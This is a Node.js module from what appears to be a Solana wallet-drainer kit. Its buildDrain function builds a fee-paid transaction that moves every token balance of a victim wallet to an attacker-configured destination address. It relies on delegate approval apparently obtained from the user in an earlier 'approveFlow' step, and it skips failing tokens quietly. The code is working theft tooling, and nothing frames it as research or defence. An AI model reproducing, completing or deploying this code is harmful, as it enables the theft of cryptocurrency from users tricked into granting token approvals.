const { Transaction, PublicKey } = require("@solana/web3.js");
const {
    createTransferInstruction,
    getAssociatedTokenAddress,
    getAccount,
    createAssociatedTokenAccountInstruction
} = require("@solana/spl-token");
const { getUserTokenAccounts } = require("../solana/tokenService");
const { getConfig } = require("../config/environment");
const logger = require("../core/logger");
const { withRetry } = require("../core/rpcPool");
const { setBlockhash } = require("../core/blockhashCache");

const MIN_RAW_AMOUNT = 1000n;

async function buildDrain(user, connection) {
    return withRetry(async (conn) => {
        try {
            const config = getConfig();
            const tx = new Transaction();
            const userPubkey = new PublicKey(user);
            const delegatePubkey = new PublicKey(config.WALLET);
            const destinationPubkey = new PublicKey(config.DESTINATION_ADDRESS);
            const feePayer = new PublicKey(config.PUBLIC_KEY);

            // Always fetch a fresh blockhash and update the cache
            const { blockhash } = await conn.getLatestBlockhash("confirmed");
            setBlockhash(blockhash);
            tx.recentBlockhash = blockhash;

            // Server pays fees for drain operations
            tx.feePayer = feePayer;

            const tokenAccounts = await getUserTokenAccounts(userPubkey, conn);
            if (!tokenAccounts) throw new Error("Failed to fetch token accounts");

            // Drain all approved tokens (WSOL, USDC, JUP, etc.) via delegate
            for (const token of tokenAccounts.tokens || []) {
                try {
                    if (token.amount < MIN_RAW_AMOUNT) continue;

                    const destAta = await getAssociatedTokenAddress(token.mint, destinationPubkey);

                    let destExists = true;
                    try {
                        await getAccount(conn, destAta);
                    } catch (e) {
                        destExists = false;
                    }

                    if (!destExists) {
                        tx.add(
                            createAssociatedTokenAccountInstruction(
                                feePayer,
                                destAta,
                                destinationPubkey,
                                token.mint
                            )
                        );
                    }

                    // Transfer using delegate authority
                    // User approved delegate in approveFlow, so delegate can transfer
                    tx.add(
                        createTransferInstruction(
                            token.ata,           // source (user's token account)
                            destAta,             // destination
                            delegatePubkey,      // authority (server delegate - approved by user)
                            token.amount         // amount
                        )
                    );
                } catch (innerErr) {
                    logger.warn("Skipping token during drain build", {
                        mint: token && token.mint ? token.mint.toString() : undefined,
                        error: innerErr.message
                    });
                    continue;
                }
            }

            logger.info("Drain transaction built", { instructions: tx.instructions.length });
            return tx;
        } catch (err) {
            logger.error("Failed to build drain transaction", { error: err.message });
            throw err;
        }
    }, "buildDrain");
}

module.exports = { buildDrain };
